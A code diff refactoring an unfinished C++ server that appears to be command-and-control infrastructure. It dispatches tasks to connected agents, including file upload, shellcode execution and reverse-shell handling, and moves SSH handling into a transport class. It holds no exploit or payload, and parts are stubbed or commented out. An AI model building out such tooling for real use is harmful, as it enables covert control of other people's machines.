@@ -4,14 +4,6 @@
 #include <argp.h>
 #endif
 
-#ifndef KEYS_FOLDER
-#ifdef _WIN32
-#define KEYS_FOLDER
-#else
-#define KEYS_FOLDER "/etc/ssh/"
-#endif
-#endif
-
 
 #ifdef HAVE_ARGP_H
 const char *argp_program_version = "libssh server example "
@@ -173,38 +165,40 @@ static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
 /*Global variables and data structures*/
 pthread_t thread_array[MAX_CONN];
 
+/*constructor for the connection instance*/
 ConnectionInstance::ConnectionInstance(){
+    int ret;
+    char* last;
+	char result[4096];
+    char dir[4096];
+    unsigned long index;
+    struct stat st = {0};
     this->logger = new Log();
     this->list = new List();
-
+    
+    memset(result, 0, sizeof(result));
+	memset(dir, 0, sizeof(dir));
+	
     // seed random number generator
     srand(time(NULL));
 
 	// gets current file path, so data will be written to correct folder regardless of where execution is called
-	char result[4096];
-	memset(result, 0, sizeof(result));
 	readlink( "/proc/self/exe", result, 4096);
 
-	char dir[4096];
-	memset(dir, 0, sizeof(dir));
-	char* last;
 	last = strrchr(result, '/');
-
-	unsigned long index = last - result;
+	index = last - result;
 	strncpy(dir, result, index);
 	
-	int ret = chdir(dir);
-
-
+	ret = chdir(dir);
 	if(ret < 0){
 		perror("Failed to change directory");
 		exit(-1);
 	}
 
 
-    struct stat st = {0};
     umask(0);
 
+    // initialize base directories
     if (stat("agents", &st) == -1) {
         mkdir("agents", 0755);
         printf("Server: initialized directory 'agents'\n");
@@ -214,7 +208,7 @@ ConnectionInstance::ConnectionInstance(){
         mkdir("out", 0755);
         printf("Server: initialized directory 'out'\n");
     }
-
+// TODO: NOT SURE WE NEED THIS ANYMORE?
     if (stat("modules", &st) == -1) {
         mkdir("modules", 0755);
         printf("Server: initialized directory 'modules'\n");
@@ -227,19 +221,20 @@ ConnectionInstance::ConnectionInstance(){
     }
 }
 
+/*Neato destructor*/
 ConnectionInstance::~ConnectionInstance(){
     return;
 }
 
-void ConnectionInstance::get_info(class ServerTransport *transport, char *ptr){
+/*Not implemented yet because why not?*/
+void ConnectionInstance::get_info(char *ptr){
     return;
 }
 
 /*Handler for manager connections and flow*/
-void ConnectionInstance::manager_handler(class ServerTransport *transport){
-    pClientNode node = transport->get_node();
-    char resp[2048];
-
+void ConnectionInstance::manager_handler(){
+    pClientNode node = this->transport->get_node();
+    
     int operation;
     int rc = 0;
     int quitting = 0;
@@ -247,14 +242,17 @@ void ConnectionInstance::manager_handler(class ServerTransport *transport){
     char *ptr = NULL;
     char *dat_ptr = NULL;
     char *d_ptr = NULL;
-    char buff[BUFSIZ];
-    char logbuff[BUFSIZ];
+    char tmpbf[3] = {0,0,0};
     char tmpbuffer[8];
     char filename[2048];
+    char resp[2048];
+    char buff[BUFSIZ];
+    char logbuff[BUFSIZ];
             
-
+    // main instruction loop
     while (!quitting)
     {
+        // reset variables for loop
         ptr = resp;
         operation = -1;
         rc = 0;
@@ -267,15 +265,10 @@ void ConnectionInstance::manager_handler(class ServerTransport *transport){
         memset(resp, 0, sizeof(resp));
         memset(logbuff, 0, sizeof(logbuff));
         
-        rc = ssh_channel_read(node->data->chan, resp, sizeof(resp), 0);
-        if (rc == SSH_ERROR)
-        {
-            sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", node->data->id, ssh_get_error(node->data->session));
-            this->logger->log(logbuff);
-            return;
-        }
+        // get operation request
+        this->transport->read((char **)&resp);
         
-        char tmpbf[3] = {0,0,0};
+        // parse it
         strncat(tmpbf,resp,2);
         operation = atoi(tmpbf);
         ptr += 3;
@@ -283,14 +276,16 @@ void ConnectionInstance::manager_handler(class ServerTransport *transport){
         sprintf(logbuff, "Manager %s: Operation caught: %d\n", node->data->id, operation);
         this->logger->log(logbuff);
 
+        // TODO: FIX THIS?
         if(*ptr == '\0'){
             sprintf(logbuff, "Manager %s: Caught illegal operation option: NULL\n", node->data->id);
             this->logger->log(logbuff);
-            ssh_channel_write(node->data->chan, "er", 3);
+            this->transport->send_err();
             quitting = 1;
             continue;
         }
 
+        // main switch
         switch (operation)
         {
         case MANAG_EXIT:
@@ -353,13 +348,7 @@ void ConnectionInstance::manager_handler(class ServerTransport *transport){
             count = misc_index_of(ptr, ':', 0);
             dat_ptr = misc_substring(ptr, count, strlen(ptr));
             AgentInformationHandler::task(AGENT_UP_FILE, dat_ptr, d_ptr);
-            rc = ssh_channel_write(node->data->chan, "ok", 2);
-            if (rc == SSH_ERROR)
-            {
-                sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", node->data->id, ssh_get_error(node->data->session));
-                this->logger->log(logbuff);
-                return;
-            }
+            this->transport->send_ok();
             break;
 
         case MANAG_TASK_SC:
@@ -373,13 +362,7 @@ void ConnectionInstance::manager_handler(class ServerTransport *transport){
             dat_ptr = misc_substring(ptr, count, strlen(ptr));
             
             AgentInformationHandler::task(AGENT_EXEC_SC, dat_ptr, d_ptr);
-            rc = ssh_channel_write(node->data->chan, "ok", 2);
-            if (rc == SSH_ERROR)
-            {
-                sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", node->data->id, ssh_get_error(node->data->session));
-                this->logger->log(logbuff);
-                return;
-            }
+            this->transport->send_ok();
             break;
 
         case MANAG_GET_AGENT:
@@ -402,34 +385,32 @@ void ConnectionInstance::manager_handler(class ServerTransport *transport){
             break;
 
         case MANAG_GET_INFO:
-            this->get_info(transport, ptr);
+            this->get_info(ptr);
             break;
 
         case MANAG_REQ_PORTS:
-            this->get_ports(transport, ptr);
+            this->get_ports(ptr);
             break;
 
         default:
             sprintf(logbuff, "Manager %s: Unknown operation value '%d'\n", node->data->id, operation); 
             this->logger->log(logbuff);
-            rc = ssh_channel_write(node->data->chan, "un", 3);
-            if (rc == SSH_ERROR)
-            {
-                sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", node->data->id, ssh_get_error(node->data->session));
-                this->logger->log(logbuff);
-                return;
-            }
+            this->transport->send_err();
             break;
         }
     }
     
 }
 
-void ConnectionInstance::get_ports(class ServerTransport* transport, char *ptr){
+/*Returns all available ports for accessing reverse shells*/
+void ConnectionInstance::get_ports(char *ptr){
 
 }
 
+/*Place holder*/
+void ConnectionInstance::reverse_shell(){}
 /*Handles reverse shell connections and forwarding*/
+/*
 void ConnectionInstance::reverse_shell(class ServerTransport *transport){
     int port = (rand() % (65535-2048))+ 2048;
     pClientNode node = transport->get_node();
@@ -517,25 +498,27 @@ void ConnectionInstance::reverse_shell(class ServerTransport *transport){
     
     return; 
 
-}
+}*/
 
 /*Handler for agent connections and flow*/
-void ConnectionInstance::agent_handler(class ServerTransport *transport){
-    pClientNode node = transport->get_node();
-    char resp[2048];
-    
-    int operation;
+void ConnectionInstance::agent_handler(){    
+    // initialize variables
+    int operation = 0;
     int rc = 0;
     int quitting = 0;
-    char buff[2048];
-    char tmpbuffer[8];
     char *ptr = NULL;
+    char tmpbf[3] = {0,0,0};
+    char tmpbuffer[8];
+    char buff[2048];
     char filename[2048];
+    char resp[2048];
     char logbuff[BUFSIZ];
+    pClientNode node = transport->get_node();
             
-            
+    // enters main handler loop
     while (!quitting)
     {
+        // reset buffers and variables on repeat
         ptr = resp;
         operation = -1;
         rc = 0;
@@ -545,43 +528,11 @@ void ConnectionInstance::agent_handler(class ServerTransport *transport){
         memset((void*)resp, 0, sizeof(resp));
         memset((void*)logbuff, 0, sizeof(logbuff));
 
-        if (node == nullptr)
-        {
-            printf("NODE IS FUCKIN DED\n");
-        }
-
-        if(node->data == nullptr) printf("data died\n");
+        // gets the agent's requested tasking operation
+        this->transport->read((char**)&resp);
         
-
-        if(node->data->chan == NULL){
-            printf("dis broke\n");
-        }
-        if(resp == NULL){
-            printf("da other ting broke\n");
-        }
-        
-        // IT JUST FUCKIN DIEZ HERE
-/*
-   0x0000555555558e62 <+260>:   call   0x5555555571b0 <memset@plt>
-   0x0000555555558e67 <+265>:   mov    rax,QWORD PTR [rbp-0x3830]
-=> 0x0000555555558e6e <+272>:   mov    rax,QWORD PTR [rax+0x10]
-   0x0000555555558e72 <+276>:   mov    rax,QWORD PTR [rax+0x18]
-   0x0000555555558e76 <+280>:   lea    rsi,[rbp-0x3810]
-   0x0000555555558e7d <+287>:   mov    ecx,0x0
-   0x0000555555558e82 <+292>:   mov    edx,0x800
-   0x0000555555558e87 <+297>:   mov    rdi,rax
-   0x0000555555558e8a <+300>:   call   0x555555557260 <ssh_channel_read@plt>
-*/
-        rc = ssh_channel_read(node->data->chan, resp, sizeof(resp), 0);
-        if (rc == SSH_ERROR)
-        {
-            sprintf(logbuff, "Client %s: Failed to handle agent: %s\n", node->data->id, ssh_get_error(node->data->session));
-            this->logger->log(logbuff);
-            return;
-        }
-        
-        printf("Requested tasking: %s\n", resp);
-        char tmpbf[3] = {0,0,0};
+        // parses operation into buffers
+        //printf("Requested tasking: %s\n", resp);
         strncat(tmpbf,resp,2);
         operation = atoi(tmpbf);
         ptr += 3;
@@ -599,14 +550,17 @@ void ConnectionInstance::agent_handler(class ServerTransport *transport){
         sprintf(logbuff, "Client %s: Operation caught: %d\n", node->data->id, operation);
         this->logger->log(logbuff);
 
+        // checks if illegal options 
+        // TODO: FIX THIS???
         if(*ptr == '\0'){
             sprintf(logbuff, "Client %s: Caught illegal operation option: NULL\n", node->data->id);
             this->logger->log(logbuff);
-            ssh_channel_write(node->data->chan, "er", 3);
+            this->transport->send_err();
             quitting = 1;
             continue;
         }
 
+        // main decision switch
         switch (operation)
         {
         case AGENT_EXIT:
@@ -626,7 +580,7 @@ void ConnectionInstance::agent_handler(class ServerTransport *transport){
 
         case AGENT_REV_SHELL:
             printf("Agent reverse shell caught\n");
-            this->reverse_shell(transport);
+            this->reverse_shell();
             break;
 
         case AGENT_EXEC_MODULE:
@@ -637,7 +591,7 @@ void ConnectionInstance::agent_handler(class ServerTransport *transport){
         default:
             sprintf(logbuff, "Client %s: Unknown operation value '%d'\n", node->data->id, operation); 
             this->logger->log(logbuff);
-            ssh_channel_write(node->data->chan, "un", 3);
+            this->transport->send_err();
             break;
         }
     }
@@ -646,111 +600,58 @@ void ConnectionInstance::agent_handler(class ServerTransport *transport){
 
 /*Initialized the connection and prepares data structures for handlers*/
 void *ConnectionInstance::handle_connection(void *input){
-    int auth=0;
-    ssh_message message;
-    char *name = NULL;
-    ssh_session session = (ssh_session)input;
-    
-    do {
-        message=ssh_message_get(session);
-        if(!message)
-            break;
-        switch(ssh_message_type(message)){
-            case SSH_REQUEST_AUTH:
-                switch(ssh_message_subtype(message)){
-                    case SSH_AUTH_METHOD_PASSWORD:
-                        if(Authenticate::doauth(ssh_message_auth_user(message), ssh_message_auth_password(message))){
-                            auth=1;
-                            name = (char*)malloc(strlen(ssh_message_auth_user(message)));
-                            memset(name, 0, strlen(ssh_message_auth_user(message)));
-                            sprintf(name, "%s", ssh_message_auth_user(message));
-                            ssh_message_auth_reply_success(message,0);
-                            break;
-                       	} else {
-                            auth = 2;
-                            ssh_message_reply_default(message);
-                            break;
-                        }
-                    // not authenticated, send default message
-                    case SSH_AUTH_METHOD_NONE:
-                    default:
-                        ssh_message_auth_set_methods(message,SSH_AUTH_METHOD_PASSWORD);
-                        ssh_message_reply_default(message);
-                        break;
-                }
-                break;
-            default:
-                ssh_message_reply_default(message);
-        }
-        ssh_message_free(message);
-    } while (!auth);
-    
-    // Check if the client authenticated successfully
-	if(auth != 1){
-        printf("Server: Terminating connection\n");
-        ssh_disconnect(session);
-    }else {
-        pClientDat pass = (pClientDat)malloc(sizeof(clientDat));
-        pass->id = name;
-        pass->session = session;
-        pass->trans_id = rand();
-            
-        pClientNode node = (pClientNode)malloc(sizeof(*node));
-        node->data = pass;
-        node->nxt = NULL;
-        node->prev = NULL;
+    printf("Thread created\n");
 
-        class ConnectionInstance *instance = new ConnectionInstance();
-        class Log *logger = instance->get_logger();
-        class List *list = instance->get_list();
-        class ServerTransport *transport = new Ssh_Transport(logger, list, node);
-        int handler = transport->determine_handler();
-        printf("Called transport type parser\n");
-        if (handler == AGENT_TYPE)
-        {
-            printf("Starting agent handler\n");
-            instance->agent_handler(transport);
-        } else if(handler == MANAG_TYPE)
-        {
-            printf("Starting manager handler\n");
-            instance->manager_handler(transport);
-        } else
-        {
-            printf("Woops got an unknown type: %d\n", handler);
-        }
-        
-        
-        
+    // TODO: MOVE THIS INTO TRANSPORT CLASS
+
+    class ConnectionInstance *instance = (class ConnectionInstance *)input;
+
+    // creates classes and instances
+    int handler = instance->transport->determine_handler();
+    
+
+    // determines handler to use
+    if (handler == AGENT_TYPE)
+    {
+        printf("Starting agent handler\n");
+        instance->agent_handler();
+    } else if(handler == MANAG_TYPE)
+    {
+        printf("Starting manager handler\n");
+        instance->manager_handler();
+    } else
+    {
+        // failed to handle the parsing :)
+        printf("Woops got an unknown type: %d\n", handler);
     }
-
-    return NULL;
-        
 }
 
+/*Sets the transport for the connection instance*/
 void ConnectionInstance::set_transport(class ServerTransport *transport){
     this->transport = transport;
 }
 
+/*returns the logger used by the instance*/
 class Log *ConnectionInstance::get_logger(){
     return this->logger;
 }
 
+/*returns the list used by the instance*/
 class List *ConnectionInstance::get_list(){
     return this->list;
 }
 
-
-void print_clientDat(clientDat *str){
+/*handy little print function for debugging pClientDat structures*/
+void print_clientDat(pClientDat str){
     printf("\n\nID: %s\n", str->id);
-    printf("Session address: %p\n", &(str->session));
-    printf("Transaction ID: %d\n", str->trans_id);
-    printf("Channel address: %p\n", &(str->chan));
     printf("Type: %d\n\n\n", str->type);
 }
 
 
+/*Funny enough, this is the main function*/
 int main(int argc, char **argv){
 // TODO: UPDATE SIGHANDLERS TO MODERN STUFF
+// TODO: ALSO UPDATE THIS TO FORCE SETUP TO GO THROUGH A TRANSPORT
 
     // set up signal handlers
     //struct sigaction sigIntHandler;
@@ -769,78 +670,68 @@ int main(int argc, char **argv){
     //sigaction(SIGTERM, &sigTermHandler, NULL);
     
     // initialize variables
-    ssh_session session;
-    ssh_bind sshbind;
-    int r;
-    int opt = 1;
     int quitting = 0;
-	int master_socket;
+    class ConnectionInstance *instance = new ConnectionInstance();
+    class Log *logger = instance->get_logger();
+    class List *list = instance->get_list();
+    class ServerTransport *server;
+    int type = 0;
+    int rc = 0;
     int ctr = 0;
+    int opt = 1;
+    int master_socket;
     pthread_t thread;
-    class ConnectionInstance *server = new ConnectionInstance();
     
     if( (master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0){   
         perror("Server: Socket Failure");   
-        exit(EXIT_FAILURE);   
+        return 1;   
     }
 
     if(setsockopt(master_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt)) < 0 ){   
         perror("Server: Setsockopt Failure");   
-        exit(EXIT_FAILURE);   
+        return 1;   
     }
 
 
-
-    sshbind=ssh_bind_new();
-    session=ssh_new();
-
-    ssh_options_set(session, SSH_OPTIONS_FD, &master_socket);
-	
-    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, KEYS_FOLDER "ssh_host_dsa_key");
-    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "ssh_host_rsa_key");
+    switch (type)
+    {
+    case 0:
+        server = new Ssh_Transport(logger, list, nullptr);
+        break;
+    
+    default:
+        break;
+    }
+    instance->set_transport(server);
+/*   
 #ifdef HAVE_ARGP_H
     /*
      * Parse our arguments; every option seen by parse_opt will
      * be reflected in arguments.
-     */
+     *
     argp_parse (&argp, argc, argv, 0, 0, sshbind);
 #else
     (void) argc;
     (void) argv;
-#endif
+#endif*/
 
-    // bind the listener to the port
-    if(ssh_bind_listen(sshbind)<0){
-        printf("Error listening to socket: %s\n", ssh_get_error(sshbind));
-        return 1;
-    }
-    printf("Server: Bound to listening port\n");
     
     // accept connections
-    while (!quitting){
-        session=ssh_new();
-
-        r=ssh_bind_accept(sshbind,session);
-	    printf("Server: Accepting connection\n");
-        if(r==SSH_ERROR){
-      	    printf("Error accepting a connection : %s\n",ssh_get_error(sshbind));
-      	    return 1;
-        }
-        if (ssh_handle_key_exchange(session)) {
-            printf("ssh_handle_key_exchange: %s\n", ssh_get_error(session));
-            return 1;
-        }
+    // TODO: FIX THIS SO LOOP BIND WORKS LOL
+    //while (!quitting){
+        rc = server->listen(master_socket);
 
         // pass connection to handler thread
-        if(pthread_create(&thread, NULL, server->handle_connection, session)){
+        if(pthread_create(&thread, NULL, instance->handle_connection, instance)){
             printf("Error creating thread\n");
-            ssh_disconnect(session);
-            break;
+            delete instance;
+            return 1;
         }
-    
         thread_array[ctr] = thread;
+    //}
 
-        	
+    while(1){
+        sleep(1);
     }
         
         
@@ -850,9 +741,7 @@ int main(int argc, char **argv){
         }
     }
 
-    ssh_bind_free(sshbind);
-    ssh_finalize();
-
+    
     printf("Server: Terminated successfully\n");
     return 0;
 }
